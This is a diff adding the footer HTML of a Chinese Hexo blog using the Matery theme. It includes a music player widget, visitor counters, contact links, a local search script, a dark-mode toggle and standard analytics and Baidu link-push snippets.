+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2024</span>
+            
+            <a href="/about" target="_blank">Doramer</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">50k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+    <a href="mailto:2657100414@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2657100414" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2657100414" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+            }
+        </script>
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
